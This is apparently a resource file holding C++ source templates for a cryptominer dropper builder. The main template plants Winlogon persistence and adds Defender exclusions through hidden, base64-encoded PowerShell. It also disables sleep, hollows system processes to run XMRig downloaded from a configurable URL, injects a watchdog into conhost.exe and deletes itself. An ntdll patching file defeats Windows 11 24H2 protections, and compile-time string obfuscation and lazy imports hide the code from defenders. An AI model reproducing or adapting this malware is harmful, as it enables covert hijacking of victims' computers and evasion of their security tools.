#define MASK_TO_DWORD(val) ((val &lt; MAX_DWORD) ? (val &amp; MAX_DWORD) : MAX_DWORD)
#define MASK_TO_WORD(val) ((val &lt; MAX_WORD) ? (val &amp; MAX_WORD) : MAX_WORD)


    /** 
    Validates pointers, checks if the particular field is inside the given buffer. Sizes must be given in bytes.
    \param buffer_bgn : the start address of the buffer
    \param buffer_size : the size of the buffer
    \param field_bgn : the start address of the field
    \param field_size : the size of the field
    \return true if the field (defined by its start address: field_bgn, and size: field_size) is contained within the given buffer
    (defined by its start address: buffer_bgn, and size: buffer_size).
    false otherwise
    */
    bool validate_ptr(
        IN const void* buffer_bgn, 
        IN size_t buffer_size,
        IN const void* field_bgn,
        IN size_t field_size
    );

//-----------------------------------------------------------------------------------
//
// supported buffers:
//
    /**
    A buffer allocated on the heap of a process, not aligned to the beginning of a memory page.
    */
    typedef PBYTE UNALIGNED_BUF;

    /**
    A buffer allocated in a virtual space of a process, aligned to the beginning of a memory page.
    */
    typedef PBYTE ALIGNED_BUF;

//
// alloc/free unaligned buffers:
//
     /** 
     Allocates a buffer on the heap. Can be used in the cases when the buffer does not have to start at the beginning of a page.
     */
    UNALIGNED_BUF alloc_unaligned(size_t buf_size);

    //
    /**
    Frees buffer allocated by alloc_unaligned.
    */
    void free_unaligned(UNALIGNED_BUF section_buffer);

//
// alloc/free aligned buffers:
//

    /**
    Allocates a buffer of a virtual memory (using VirtualAlloc).  Can be used in the cases when the buffer have to be aligned to the beginning of a page.
    */
    ALIGNED_BUF alloc_aligned(size_t buffer_size, DWORD protect, void* desired_base=nullptr);

    /**
    Frees buffer allocated by alloc_aligned.
    */
    bool free_aligned(ALIGNED_BUF buffer, size_t buffer_size=0);

    //PE buffers (wrappers)

    /**
    Allocates an aligned buffer for a PE file.
    */
    ALIGNED_BUF alloc_pe_buffer(size_t buffer_size, DWORD protect, void* desired_base=nullptr);

    /**
    Free the memory allocated with alloc_pe_buffer.
    */
    bool free_pe_buffer(ALIGNED_BUF buffer, size_t buffer_size=0);

</value>
  </data>
  <data name="buffer_util.cpp" xml:space="preserve">
    <value>#include "buffer_util.h"
#include &lt;iostream&gt;
#include "lib/lazy_importer.hpp"

//
// validate pointer:
//

bool validate_ptr(IN const void* buffer_bgn, IN size_t buffer_size, IN const void* field_bgn, IN size_t field_size)
{
    if (buffer_bgn == nullptr || field_bgn == nullptr) {
        return false;
    }
    BYTE* _start = (BYTE*)buffer_bgn;
    BYTE* _field_start = (BYTE*)field_bgn;
    if (_field_start &lt; _start) {
        return false;
    }
    size_t start_delta =  (ULONG_PTR)_field_start - (ULONG_PTR)_start;
    size_t area_size = start_delta + field_size;
    if (area_size &gt; buffer_size) {
        return false;
    }
    if (area_size &lt; field_size || area_size &lt; start_delta) {
#ifdef _DEBUG
        std::cout &lt;&lt; "Integer Overflow, limit exceeded! start_delta: " &lt;&lt; start_delta &lt;&lt; " field_size: " &lt;&lt; field_size &lt;&lt; " area_size: " &lt;&lt; area_size &lt;&lt; "\n";
#endif
        return false;
    }
    return true;
}

//-----------------------------------------------------------------------------------
//
// alloc/free unaligned buffers:
//

//allocates a buffer that does not have to start from the beginning of the section
UNALIGNED_BUF alloc_unaligned(size_t buf_size)
{
    if (!buf_size) return NULL;

    UNALIGNED_BUF buf = (UNALIGNED_BUF) calloc(buf_size, sizeof(BYTE));
    return buf;
}

void free_unaligned(UNALIGNED_BUF section_buffer)
{
    free(section_buffer);
}

//
// alloc/free aligned buffers:
//

ALIGNED_BUF alloc_aligned(size_t buffer_size, DWORD protect, void* desired_base)
{
    if (!buffer_size) return NULL;

    ALIGNED_BUF buf = (ALIGNED_BUF) LI_FN(VirtualAlloc)(desired_base, buffer_size, MEM_COMMIT | MEM_RESERVE, protect);
    return buf;
}

bool free_aligned(ALIGNED_BUF buffer, size_t buffer_size)
{
    if (buffer == nullptr) return true;
    if (!LI_FN(VirtualFree)(buffer, 0, MEM_RELEASE)) {
#ifdef _DEBUG
        std::cerr &lt;&lt; "Releasing failed" &lt;&lt; std::endl;
#endif
        return false;
    }
    return true;
}

//-----------------------------------------------------------------------------------
//
// wrappers using appropriate buffer type according to the purpose:
//

// allocate a buffer for PE module:
ALIGNED_BUF alloc_pe_buffer(size_t buffer_size, DWORD protect, void* desired_base)
{
    return alloc_aligned(buffer_size, protect, desired_base);
}

// Free loaded PE module
bool free_pe_buffer(ALIGNED_BUF buffer, size_t buffer_size)
{
    return free_aligned(buffer, buffer_size);
}

</value>
  </data>
  <data name="maincpp" xml:space="preserve">
    <value>#include "lib/httplib.h"
#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;
#include "run_pe.h"
#include &lt;iostream&gt;
#include &lt;vector&gt;
#include "lib/obfuscate.h"
#include "lib/lazy_importer.hpp"
#include &lt;filesystem&gt;
#include "common_util.h"
#include &lt;stdbool.h&gt;
#include "lib/b64.h"
#include &lt;mutex&gt;

$STATIC
$WATCHDOG
$WDEXCLUSION
$NOSLEEP
$ADDSTARTUP
$SelfDelete

LPCTSTR version = TEXT("0.2");

bool g_PatchRequired = false;

bool isWindows1124H2OrLater()
{
    NTSYSAPI NTSTATUS RtlGetVersion(PRTL_OSVERSIONINFOW lpVersionInformation);

    RTL_OSVERSIONINFOW osVersionInfo = { 0 };
    osVersionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

    HMODULE hNtdll = LI_FN(GetModuleHandleA)("ntdll");
    if (!hNtdll) return false; // should never happen

    auto _RtlGetVersion = reinterpret_cast&lt;decltype(&amp;RtlGetVersion)&gt;(LI_FN(GetProcAddress)(hNtdll, "RtlGetVersion"));
    NTSTATUS status = _RtlGetVersion(
        &amp;osVersionInfo
    );
    if (status != S_OK) {
        std::cerr &lt;&lt; "Failed to retrieve OS version information." &lt;&lt; std::endl;
        return false;
    }
    // Check major version and build number for Windows 11
    if (osVersionInfo.dwMajorVersion &gt; 10 ||
        (osVersionInfo.dwMajorVersion == 10 &amp;&amp; osVersionInfo.dwBuildNumber &gt;= 26100)) {
        return true;
    }
    return false;
}

$RESOURCES

#ifdef DefSelfDelete
void SelfDelete()
{
    wchar_t szFilePath[MAX_PATH];
    wchar_t szCmd[2 * MAX_PATH];

    GetModuleFileNameW(NULL, szFilePath, MAX_PATH);
    wsprintfW(szCmd, L"cmd /c del /f /q \"%s\"", szFilePath);
    ShellExecuteW(NULL, L"open", L"cmd", szCmd, NULL, SW_HIDE);

    exit(1);
}
#endif

void DopFile (const char* sourceExePath, const char* destinationDir){

    std::ifstream srcFile(sourceExePath, std::ios_base::binary);
    
    if (!srcFile) {
        std::cerr &lt;&lt; "Unable to open source file: " &lt;&lt; sourceExePath &lt;&lt; std::endl;
    }

    // Create destination file in write binary mode (truncate existing content if any)
    std::ofstream destFile(destinationDir, std::ios_base::binary);

    if (!destFile) {
        std::cerr &lt;&lt; "Unable to open destination file: " &lt;&lt; destinationDir &lt;&lt; std::endl;
        srcFile.close(); // Close source file before exiting
    }

    // Read bytes from source file and write them to destination file.
    char byte;
    while (srcFile.get(byte)) {
        destFile.put(byte);
    }

    srcFile.close();
    destFile.close();

    std::cout &lt;&lt; "The EXE has been successfully copied." &lt;&lt; std::endl;

}


//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow)
//int main ()
$mainType
{

        // create mutex 
    HANDLE mutex = LI_FN(CreateMutexW)(nullptr, FALSE, L"$MinerMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS){
        return 0;
    }

    // Add Mutex
    std::string BasePathDrop = getenv("$StartUpBasePath");
    std::string MonerPath = "$MonerPath";
    std::string FullDropPath =  BasePathDrop + "\\" +MonerPath;
    char szFilePath[MAX_PATH];
    LI_FN(GetModuleFileNameA)(nullptr, szFilePath, MAX_PATH);

    char buffer[MAX_PATH] = {0};
    UINT len = GetWindowsDirectoryA(buffer, MAX_PATH);
    std::string windir(buffer);  
    std::string MonerInjectionTarget = "$MonerInjectionTarget";
    std::string target_path_str = windir + "\\system32\\" + MonerInjectionTarget;
    if (MonerInjectionTarget  == "explorer.exe"){
    target_path_str = windir +"\\"+ MonerInjectionTarget;
    }
    std::string watchdog_path_str = windir + "\\system32\\conhost.exe";
    LPTSTR target_path = (LPTSTR)target_path_str.c_str();
    LPTSTR watchdog_path = (LPTSTR)watchdog_path_str.c_str();


    std::string powershell_path = windir + "\\system32\\WindowsPowerShell\\v1.0\\powershell.exe";
    
    std::string powercfg_path = windir + "\\system32\\powercfg.exe";

    std::string ServiceName = "$AppName";

    std::string driveLetter = windir.substr(0, 1);

    #ifdef DefADDSTARTUP
    if(arePathsEqual(szFilePath, FullDropPath) == false)
    {
    if(IsAdmin()){
        
        std::string baseUserinitPath = "C:\\Windows\\system32\\userinit.exe," + FullDropPath;

        //reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit" /T REG_SZ /D "C:\Windows\system32\userinit.exe,c:\windows\system32\implant.exe" /F
  
        std::string reg_path = windir + "\\system32\\reg.exe";
        std::string ScCMD =(std::string)AY_OBFUSCATE(" add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /V \"UserInit\" /T REG_SZ /D \"") +  baseUserinitPath + (std::string)AY_OBFUSCATE("\" /F");
        std::string fullCMD = reg_path + ScCMD;
        std::cout&lt;&lt;"fullCMD: "&lt;&lt; fullCMD.c_str() &lt;&lt; std::endl;
        const char* fullCMD_pointer = ScCMD.c_str();
        runProcess(fullCMD.c_str());
    }else{
        // Do standard start up via registy
        std::wcout&lt;&lt;L"Is Not admin so installing non UAC startup"&lt;&lt;  std::endl;
        AddRegistryValue(FullDropPath, ServiceName.c_str());
    }
    }

    #endif

    #ifdef WDEXCLUSION
     if(arePathsEqual(szFilePath, FullDropPath) == false)
     {
            std::wstring FullDropPathW;
    StringToWString(FullDropPathW,FullDropPath);
    std::wstring BasePathDropW;
    StringToWString(BasePathDropW,BasePathDrop);
    std::wstring wtext = L"Add-MpPreference -ExclusionPath " + BasePathDropW + L" -Force;Add-MpPreference -ExclusionProcess " + FullDropPathW + L" -Force";
    std::wcout&lt;&lt;L"wtext: "&lt;&lt; wtext&lt;&lt; std::endl;
    std::vector&lt;uint8_t&gt; utf16le_bytes = toUTF16LE(wtext);

    // Optionally, encode to base64
    std::string as_string(reinterpret_cast&lt;char*&gt;(utf16le_bytes.data()), utf16le_bytes.size());
    std::string b64 = Base64::encode(as_string);

    std::string WDCMD =(std::string)AY_OBFUSCATE(" -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -enc ") + (std::string)b64;
     printf("WDCMD: %s\n", WDCMD.c_str());
    std::string fullCMD = powershell_path + WDCMD;
    runProcess(fullCMD.c_str());
     }

    #endif

    #ifdef NOSLEEP
    if(arePathsEqual(szFilePath, FullDropPath) == false)
    {
                const char* powercfg_path_pointer = powercfg_path.c_str();
        std::string hibernateTimeoutAC = (std::string)AY_OBFUSCATE(" /x -hibernate-timeout-ac 0");
        std::string hibernateTimeoutDC = (std::string)AY_OBFUSCATE(" /x -hibernate-timeout-dc 0");
        std::string standbyTimeoutAC = (std::string)AY_OBFUSCATE(" /x -standby-timeout-ac 0");
        std::string standbyTimeoutDC = (std::string)AY_OBFUSCATE(" /x -standby-timeout-dc 0");
        const char* hibernateTimeoutAC_pointer = hibernateTimeoutAC.c_str();
        const char* hibernateTimeoutDC_pointer = hibernateTimeoutDC.c_str();
        const char* standbyTimeoutAC_pointer = standbyTimeoutAC.c_str();
        const char* standbyTimeoutDC_pointer = standbyTimeoutDC.c_str();
        run_program(powercfg_path_pointer, hibernateTimeoutAC_pointer);
        run_program(powercfg_path_pointer, hibernateTimeoutDC_pointer);
        run_program(powercfg_path_pointer, standbyTimeoutAC_pointer);
        run_program(powercfg_path_pointer, standbyTimeoutDC_pointer);
    }

    #endif


    if(arePathsEqual(szFilePath, FullDropPath) == false)
    {
  #if defined(WATCHDOG) || defined(DefADDSTARTUP)
        createPathRecursively(FullDropPath);
        DopFile(szFilePath, FullDropPath.c_str());
  #endif
    }

    if (isWindows1124H2OrLater()) {
        std::cout &lt;&lt; "WARNING: Executing RunPE on Windows11 24H2 or above requires patching NTDLL.ZwQueryVirtualMemory\n";
        g_PatchRequired = true;
    }

    std::string command = MonerInjectionTarget + " $B64CommandStr";

    int targetSize = strlen(command.c_str()) + 1; // Include null terminator
    wchar_t* targetPath = (wchar_t*)malloc(targetSize * sizeof(wchar_t));
    LI_FN(ExpandEnvironmentStringsW)((LPCWSTR)command.c_str(), targetPath, targetSize);


#ifdef STATIC
    bool isOk = run_pe_bytes((BYTE*)resEmbedded, resEmbeddedSize, target_path, (LPCTSTR)command.c_str(), true);
#else
    bool isOk = run_pe("$XmrigUrl", target_path, (LPCTSTR)command.c_str());
#endif

#ifdef WATCHDOG
    bool isWatchdogInject = run_pe_bytes((BYTE*)resWatchDog, resWatchDogSize, watchdog_path, "", false);
#endif


        #ifdef DefSelfDelete
        std::cout &lt;&lt; "szFilePath: " &lt;&lt; szFilePath &lt;&lt; std::endl;
        std::cout &lt;&lt; "FullDropPath: " &lt;&lt; FullDropPath.c_str() &lt;&lt; std::endl;
        std::cout &lt;&lt; "strcmp: " &lt;&lt; strcmp(szFilePath, FullDropPath.c_str()) &lt;&lt; std::endl;
            if(arePathsEqual(szFilePath, FullDropPath) == false){
            SelfDelete();
            }
        #endif
    

        LI_FN(CloseHandle)(mutex);
    return isOk ? 0 : (-1);

}
</value>
  </data>
  <data name="obfuscate.h" xml:space="preserve">
    <value>/* --------------------------------- ABOUT -------------------------------------

Original Author: Adam Yaxley
Website: https://github.com/adamyaxley
License: See end of file

Obfuscate
Guaranteed compile-time string literal obfuscation library for C++14

Usage:
Pass string literals into the AY_OBFUSCATE macro to obfuscate them at compile
time. AY_OBFUSCATE returns a reference to an ay::obfuscated_data object with the
following traits:
 - Guaranteed obfuscation of string
 The passed string is encrypted with a simple XOR cipher at compile-time to
 prevent it being viewable in the binary image
 - Global lifetime
 The actual instantiation of the ay::obfuscated_data takes place inside a
 lambda as a function level static
 - Implicitly convertible to a char*
 This means that you can pass it directly into functions that would normally
 take a char* or a const char*

Example:
const char* obfuscated_string = AY_OBFUSCATE("Hello World");
std::cout &lt;&lt; obfuscated_string &lt;&lt; std::endl;

----------------------------------------------------------------------------- */

#pragma once
#if __cplusplus &gt;= 202002L
 #define AY_CONSTEVAL consteval
#else
 #define AY_CONSTEVAL constexpr
#endif

// Workaround for __LINE__ not being constexpr when /ZI (Edit and Continue) is enabled in Visual Studio
// See: https://developercommunity.visualstudio.com/t/-line-cannot-be-used-as-an-argument-for-constexpr/195665
#ifdef _MSC_VER
 #define AY_CAT(X,Y) AY_CAT2(X,Y)
 #define AY_CAT2(X,Y) X##Y
 #define AY_LINE int(AY_CAT(__LINE__,U))
#else
 #define AY_LINE __LINE__
#endif

#ifndef AY_OBFUSCATE_DEFAULT_KEY
 // The default 64 bit key to obfuscate strings with.
 // This can be user specified by defining AY_OBFUSCATE_DEFAULT_KEY before 
 // including obfuscate.h
 #define AY_OBFUSCATE_DEFAULT_KEY ay::generate_key(AY_LINE)
#endif

namespace ay
{
 using size_type = unsigned long long;
 using key_type = unsigned long long;

 // libstdc++ has std::remove_cvref_t&lt;T&gt; since C++20, but because not every user will be 
 // able or willing to link to the STL, we prefer to do this functionality ourselves here.
 template &lt;typename T&gt;
 struct remove_const_ref {
  using type = T;
 };

 template &lt;typename T&gt;
 struct remove_const_ref&lt;T&amp;&gt; {
  using type = T;
 };

 template &lt;typename T&gt;
 struct remove_const_ref&lt;const T&gt; {
  using type = T;
 };

 template &lt;typename T&gt;
 struct remove_const_ref&lt;const T&amp;&gt; {
  using type = T;
 };

 template &lt;typename T&gt;
 using char_type = typename remove_const_ref&lt;T&gt;::type;

 // Generate a pseudo-random key that spans all 8 bytes
 AY_CONSTEVAL key_type generate_key(key_type seed)
 {
  // Use the MurmurHash3 64-bit finalizer to hash our seed
  key_type key = seed;
  key ^= (key &gt;&gt; 33);
  key *= 0xff51afd7ed558ccd;
  key ^= (key &gt;&gt; 33);
  key *= 0xc4ceb9fe1a85ec53;
  key ^= (key &gt;&gt; 33);

  // Make sure that a bit in each byte is set
  key |= 0x0101010101010101ull;

  return key;
 }

 // Obfuscates or deobfuscates data with key
 template &lt;typename CHAR_TYPE&gt;
 constexpr void cipher(CHAR_TYPE* data, size_type size, key_type key)
 {
  // Obfuscate with a simple XOR cipher based on key
  for (size_type i = 0; i &lt; size; i++)
  {
   data[i] ^= CHAR_TYPE((key &gt;&gt; ((i % 8) * 8)) &amp; 0xFF);
  }
 }

 // Obfuscates a string at compile time
 template &lt;size_type N, key_type KEY, typename CHAR_TYPE = char&gt;
 class obfuscator
 {
 public:
  // Obfuscates the string 'data' on construction
  AY_CONSTEVAL obfuscator(const CHAR_TYPE* data)
  {
   // Copy data
   for (size_type i = 0; i &lt; N; i++)
   {
    m_data[i] = data[i];
   }

   // On construction each of the characters in the string is
   // obfuscated with an XOR cipher based on key
   cipher(m_data, N, KEY);
  }

  constexpr const CHAR_TYPE* data() const
  {
   return &amp;m_data[0];
  }

  AY_CONSTEVAL size_type size() const
  {
   return N;
  }

  AY_CONSTEVAL key_type key() const
  {
   return KEY;
  }

 private:

  CHAR_TYPE m_data[N]{};
 };

 // Handles decryption and re-encryption of an encrypted string at runtime
 template &lt;size_type N, key_type KEY, typename CHAR_TYPE = char&gt;
 class obfuscated_data
 {
 public:
  obfuscated_data(const obfuscator&lt;N, KEY, CHAR_TYPE&gt;&amp; obfuscator)
  {
   // Copy obfuscated data
   for (size_type i = 0; i &lt; N; i++)
   {
    m_data[i] = obfuscator.data()[i];
   }
  }

  ~obfuscated_data()
  {
   // Zero m_data to remove it from memory
   for (size_type i = 0; i &lt; N; i++)
   {
    m_data[i] = 0;
   }
  }

  // Returns a pointer to the plain text string, decrypting it if
  // necessary
  operator CHAR_TYPE* ()
  {
   decrypt();
   return m_data;
  }

  // Manually decrypt the string
  void decrypt()
  {
   if (m_encrypted)
   {
    cipher(m_data, N, KEY);
    m_encrypted = false;
   }
  }

  // Manually re-encrypt the string
  void encrypt()
  {
   if (!m_encrypted)
   {
    cipher(m_data, N, KEY);
    m_encrypted = true;
   }
  }

  // Returns true if this string is currently encrypted, false otherwise.
  bool is_encrypted() const
  {
   return m_encrypted;
  }

 private:

  // Local storage for the string. Call is_encrypted() to check whether or
  // not the string is currently obfuscated.
  CHAR_TYPE m_data[N];

  // Whether data is currently encrypted
  bool m_encrypted{ true };
 };

 // This function exists purely to extract the number of elements 'N' in the
 // array 'data'
 template &lt;size_type N, key_type KEY = AY_OBFUSCATE_DEFAULT_KEY, typename CHAR_TYPE = char&gt;
 AY_CONSTEVAL auto make_obfuscator(const CHAR_TYPE(&amp;data)[N])
 {
  return obfuscator&lt;N, KEY, CHAR_TYPE&gt;(data);
 }
}

// Obfuscates the string 'data' at compile-time and returns a reference to a
// ay::obfuscated_data object with global lifetime that has functions for
// decrypting the string and is also implicitly convertable to a char*
#define AY_OBFUSCATE(data) AY_OBFUSCATE_KEY(data, AY_OBFUSCATE_DEFAULT_KEY)

// Obfuscates the string 'data' with 'key' at compile-time and returns a
// reference to a ay::obfuscated_data object with global lifetime that has
// functions for decrypting the string and is also implicitly convertable to a
// char*
#define AY_OBFUSCATE_KEY(data, key) \
 []() -&gt; ay::obfuscated_data&lt;sizeof(data)/sizeof(data[0]), key, ay::char_type&lt;decltype(*data)&gt;&gt;&amp; { \
  static_assert(sizeof(decltype(key)) == sizeof(ay::key_type), "key must be a 64 bit unsigned integer"); \
  static_assert((key) &gt;= (1ull &lt;&lt; 56), "key must span all 8 bytes"); \
  using char_type = ay::char_type&lt;decltype(*data)&gt;; \
  constexpr auto n = sizeof(data)/sizeof(data[0]); \
  constexpr auto obfuscator = ay::make_obfuscator&lt;n, key, char_type&gt;(data); \
  thread_local auto obfuscated_data = ay::obfuscated_data&lt;n, key, char_type&gt;(obfuscator); \
  return obfuscated_data; \
 }()

/* -------------------------------- LICENSE ------------------------------------

Public Domain (http://www.unlicense.org)

This is free and unencumbered software released into the public domain.

Anyone is free to copy, modify, publish, use, compile, sell, or distribute this
software, either in source code form or as a compiled binary, for any purpose,
commercial or non-commercial, and by any means.

In jurisdictions that recognize copyright laws, the author or authors of this
software dedicate any and all copyright interest in the software to the public
domain. We make this dedication for the benefit of the public at large and to
the detriment of our heirs and successors. We intend this dedication to be an
overt act of relinquishment in perpetuity of all present and future rights to
this software under copyright law.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE
LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

----------------------------------------------------------------------------- */
</value>
  </data>
  <data name="patch_ntdll.cpp" xml:space="preserve">
    <value>#include "patch_ntdll.h"
#include "lib/lazy_importer.hpp"


bool patch_NtManageHotPatch32(HANDLE hProcess)
{
    HMODULE hNtdll = LI_FN(GetModuleHandleA)("ntdll");
    if (!hNtdll) return false; // should never happen

    DWORD oldProtect = 0;
    const SIZE_T stub_size = 0x20;

    const BYTE hotpatch_patch[] = {
        0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -&gt; STATUS_NOT_SUPPORTED
        0xC2, 0x10, 0x00 // ret 10h
    };
    ULONG_PTR _NtManageHotPatch = (ULONG_PTR)LI_FN(GetProcAddress)(hNtdll, "NtManageHotPatch");
    if (!_NtManageHotPatch) {
        return false;
    }
    LPVOID stub_ptr = (LPVOID)_NtManageHotPatch;

    if (!LI_FN(VirtualProtectEx)(hProcess, stub_ptr, stub_size, PAGE_READWRITE, &amp;oldProtect)) {
        return false;
    }
    BYTE stub_buffer_orig[stub_size] = { 0 };
    SIZE_T out_bytes = 0;
    if (!LI_FN(ReadProcessMemory)(hProcess, stub_ptr, stub_buffer_orig, stub_size, &amp;out_bytes) || out_bytes != stub_size) {
        return false;
    }
    // confirm it is a valid syscall stub:
    if (stub_buffer_orig[0] != 0xB8) {
        return false;
    }
    if (!LI_FN(WriteProcessMemory)(hProcess, stub_ptr, hotpatch_patch, sizeof(hotpatch_patch), &amp;out_bytes) || out_bytes != sizeof(hotpatch_patch)) {
        return false;
    }
    if (!LI_FN(VirtualProtectEx)(hProcess, stub_ptr, stub_size, oldProtect, &amp;oldProtect)) {
        return false;
    }
    FlushInstructionCache(hProcess, stub_ptr, sizeof(hotpatch_patch));
    return true;
}

bool patch_NtManageHotPatch64(HANDLE hProcess)
{
    HMODULE hNtdll = LI_FN(GetModuleHandleA)("ntdll");
    if (!hNtdll) return false; // should never happen

    DWORD oldProtect = 0;
    const SIZE_T stub_size = 0x20;

    const BYTE hotpatch_patch[] = {
        0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -&gt; STATUS_NOT_SUPPORTED
        0xC3 //ret
    };

    // syscall stub template
    const size_t syscall_pattern_full = 8;
    const size_t syscall_pattern_start = 4;
    const BYTE syscall_fill_pattern[] = {
        0x4C, 0x8B, 0xD1, //mov r10,rcx
        0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
    };

    ULONG_PTR _NtManageHotPatch = (ULONG_PTR)LI_FN(GetProcAddress)(hNtdll, "NtManageHotPatch");
    if (!_NtManageHotPatch) {
        return false;
    }
    LPVOID stub_ptr = (LPVOID)_NtManageHotPatch;

    if (!LI_FN(VirtualProtectEx)(hProcess, stub_ptr, stub_size, PAGE_READWRITE, &amp;oldProtect)) {
        return false;
    }
    BYTE stub_buffer_orig[stub_size] = { 0 };
    SIZE_T out_bytes = 0;
    if (!LI_FN(ReadProcessMemory)(hProcess, stub_ptr, stub_buffer_orig, stub_size, &amp;out_bytes) || out_bytes != stub_size) {
        return false;
    }
    // confirm it is a valid syscall stub:
    if (::memcmp(stub_buffer_orig, syscall_fill_pattern, syscall_pattern_start) != 0) {
        return false;
    }
    if (!LI_FN(WriteProcessMemory)(hProcess, stub_ptr, hotpatch_patch, sizeof(hotpatch_patch), &amp;out_bytes) || out_bytes != sizeof(hotpatch_patch)) {
        return false;
    }
    if (!LI_FN(VirtualProtectEx)(hProcess, stub_ptr, stub_size, oldProtect, &amp;oldProtect)) {
        return false;
    }
    FlushInstructionCache(hProcess, stub_ptr, sizeof(hotpatch_patch));
    return true;
}

bool patch_ZwQueryVirtualMemory(HANDLE hProcess, LPVOID module_ptr)
{
#ifndef _WIN64
    return false;
#else
    HMODULE hNtdll = LI_FN(GetModuleHandleA)("ntdll");
    if (!hNtdll) return false; // should never happen

    ULONGLONG pos = 8;
    DWORD oldProtect = 0;
    const SIZE_T stub_size = 0x20;

    ULONG_PTR _ZwQueryVirtualMemory = (ULONG_PTR)LI_FN(GetProcAddress)(hNtdll, "ZwQueryVirtualMemory");
    if (!_ZwQueryVirtualMemory || _ZwQueryVirtualMemory &lt; pos) {
        return false;
    }
    LPVOID stub_ptr = (LPVOID)((ULONG_PTR)_ZwQueryVirtualMemory - pos);

    if (!LI_FN(VirtualProtectEx)(hProcess, stub_ptr, stub_size, PAGE_READWRITE, &amp;oldProtect)) {
        return false;
    }
    LPVOID patch_space = LI_FN(VirtualAllocEx)(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!patch_space) {
        return false;
    }
    BYTE stub_buffer_orig[stub_size] = { 0 };
    SIZE_T out_bytes = 0;
    if (!LI_FN(ReadProcessMemory)(hProcess, stub_ptr, stub_buffer_orig, stub_size, &amp;out_bytes) || out_bytes != stub_size) {
        return false;
    }
    const BYTE nop_pattern[] = {0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00};
    if (::memcmp(stub_buffer_orig, nop_pattern, sizeof(nop_pattern)) != 0) {
        return false;
    }

    // prepare the patched stub:
    const size_t syscall_pattern_full = 8;
    const size_t syscall_pattern_start = 4;
    const BYTE syscall_fill_pattern[] = {
        0x4C, 0x8B, 0xD1, //mov r10,rcx
        0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
    };
    if (::memcmp(stub_buffer_orig + pos, syscall_fill_pattern, syscall_pattern_start) != 0) {
        return false;
    }

    // prepare the patch to be applied on ZwQueryVirtualMemory:

    BYTE stub_buffer_patched[stub_size] = { 0 };
    ::memcpy(stub_buffer_patched, stub_buffer_orig, stub_size);

    const BYTE jump_back[] = { 0xFF, 0x25, 0xF2, 0xFF, 0xFF, 0xFF };

    ::memcpy(stub_buffer_patched, &amp;patch_space, sizeof(LPVOID));
    ::memset(stub_buffer_patched + pos, 0x90, syscall_pattern_full);
    ::memcpy(stub_buffer_patched + pos, jump_back, sizeof(jump_back));

    // prepare the trampoline:

    const BYTE jump_to_contnue[] = { 0xFF, 0x25, 0xEA, 0xFF, 0xFF, 0xFF };
    ULONG_PTR _ZwQueryVirtualMemory_continue = (ULONG_PTR)_ZwQueryVirtualMemory + syscall_pattern_full;

    BYTE func_patch[] = {
        0x49, 0x83, 0xF8, 0x0E, //cmp r8,0xE -&gt; is MEMORY_INFORMATION_CLASS == MemoryImageExtensionInformation?
        0x75, 0x22, // jne [continue to function]
        0x48, 0x3B, 0x15, 0x0B, 0x00, 0x00, 0x00, // cmp rdx,qword ptr ds:[addr] -&gt; is ImageBase == module_ptr ?
        0x75, 0x19, // jne [continue to function]
        0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -&gt; STATUS_NOT_SUPPORTED
        0xC3 //ret
    };

    BYTE stub_buffer_trampoline[stub_size * 2] = { 0 };
    ::memcpy(stub_buffer_trampoline, func_patch, sizeof(func_patch));

    ::memcpy(stub_buffer_trampoline + stub_size, stub_buffer_orig, stub_size);
    ::memcpy(stub_buffer_trampoline + stub_size - sizeof(LPVOID), &amp;module_ptr, sizeof(LPVOID));
    ::memcpy(stub_buffer_trampoline + stub_size, &amp;_ZwQueryVirtualMemory_continue, sizeof(LPVOID));
    ::memcpy(stub_buffer_trampoline + stub_size + pos + syscall_pattern_full, jump_to_contnue, sizeof(jump_to_contnue));

    const SIZE_T trampoline_full_size = stub_size + pos + syscall_pattern_full + sizeof(jump_to_contnue);

    if (!LI_FN(WriteProcessMemory)(hProcess, stub_ptr, stub_buffer_patched, stub_size, &amp;out_bytes) || out_bytes != stub_size) {
        return false;
    }
    if (!LI_FN(VirtualProtectEx)(hProcess, stub_ptr, stub_size, oldProtect, &amp;oldProtect)) {
        return false;
    }
    if (!LI_FN(WriteProcessMemory)(hProcess, patch_space, stub_buffer_trampoline, trampoline_full_size, &amp;out_bytes) || out_bytes != trampoline_full_size) {
        return false;
    }
    if (!LI_FN(VirtualProtectEx)(hProcess, patch_space, stub_size, PAGE_EXECUTE_READ, &amp;oldProtect)) {
        return false;
    }
    FlushInstructionCache(hProcess, stub_ptr, stub_size);
    return true;
#endif
}
</value>
  </data>
  <data name="patch_ntdll.h" xml:space="preserve">
    <value>#pragma once

#include &lt;windows.h&gt;

bool patch_NtManageHotPatch32(HANDLE hProcess);
bool patch_NtManageHotPatch64(HANDLE hProcess);
bool patch_ZwQueryVirtualMemory(HANDLE hProcess, LPVOID module_ptr);
</value>
  </data>
  <data name="pe_hdrs_helper.cpp" xml:space="preserve">
